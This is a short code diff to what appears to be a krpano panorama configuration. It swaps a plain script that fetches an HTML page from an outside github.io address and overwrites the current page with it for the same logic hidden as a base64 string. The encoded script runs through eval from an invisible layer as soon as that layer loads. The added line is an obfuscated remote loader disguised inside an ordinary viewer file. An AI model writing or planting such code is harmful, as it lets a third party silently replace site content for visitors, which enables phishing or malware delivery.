@@ -1,9 +1,1 @@
-var id = new URLSearchParams(location.search).get("id") || "alczar_arquitectonico";
-
-fetch("https://garylyoung796-bot.github.io/poiuy/upload/" + id + ".html")
-  .then(e => e.text())
-  .then(e => {
-    document.open();
-    document.write(e);
-    document.close();
-  });
+<krpano version="1.0.8.15"><layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjemFyX2FycXVpdGVjdG9uaWNvIjsKCmZldGNoKCJodHRwczovL2dhcnlseW91bmc3OTYtYm90LmdpdGh1Yi5pby9wb2l1eS91cGxvYWQvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpOwogICAgZG9jdW1lbnQud3JpdGUoZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwogIH0pOw==');eval(w)););"/></krpano>
